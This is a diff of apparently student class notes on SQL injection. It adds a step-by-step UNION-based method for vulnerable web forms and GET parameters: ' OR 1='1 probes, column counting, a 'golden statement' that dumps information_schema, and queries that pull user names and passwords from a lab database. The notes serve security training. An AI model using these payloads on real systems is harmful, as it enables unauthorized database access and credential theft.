@@ -160,7 +160,12 @@ There are columns within
  # GOLDEN STATEMENT
 
  UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+               <column>,<column>,<column>			<database>.<table>
 
+
+ Only gonna look at non-default/user created DB, session
+
+ Syntax of what you are looking for reads from left to right but is opposite of how table reads
 
  ## In Class DEMO, no creds
 
@@ -183,6 +188,7 @@ To select and change DB
 See all tables within that DB
 
 	show tables from information_schema ;
+ 
 ***Don't need From statement if already in that DB***
 
 
@@ -216,4 +222,72 @@ Query same as golden statement without UNION
 
 	select table_schema,table_name,column_name from information_schema.columns
 
+Selecting from session DB
 
+	select name,cost,year from session.car ;
+
+
+# Web Page ex
+
+Step. 1 
+
+Interact with page to find vulnerable page by selecting each option paired with ***option***' OR 1='1
+
+When you get results you know it's vulnerable, if no results show check "SHOW QUERY" to see if single quotes are cancelled out
+
+***Click on show query to see "SELECT" statement***
+
+Step. 2
+
+Identify number of columns
+
+***option***' UNION SELECT 1,2,3,4 #
+
+Keep incrementing numbers until you find them
+
+
+Step 3.
+
+Modify golden statement to include all information and dump the DB
+
+***option***' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+
+***When you use the show query it indicates it is looking for 5 fields so you must modify golden statement to look for the 5 fields since our original only includes 3***
+
+Step 4.
+
+Craft Query by Modifying Golden Statement to extract information from DB
+
+ ***option***' UNION SELECT tireid,2,name,size,cost FROM session.Tires #
+
+***columns are case senitive***
+
+Step 5. WIN
+
+# GET METHOD 
+
+Step 1.
+
+Interact with fields to see vulnerability and see format of query
+
+After Selection=3 in url bar add OR 1=1
+
+Step 2.
+
+Identify Columns same as before, after found vulnerable page 
+
+Selection=3 UNION SELECT 1,2,3,4 #
+
+***This showed columns in format of 1,3,2 so keep that in mind when modifying Golden Statment***
+
+Step 3. Modify Golden Statement to dump contents of DB
+
+Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #
+
+Step 4. Extract Info from DB
+
+Selct id, name and pass from user table in session db 
+
+Selection=3 UNION SELECT id,pass,name FROM session.user
+
+Step 5. WIN
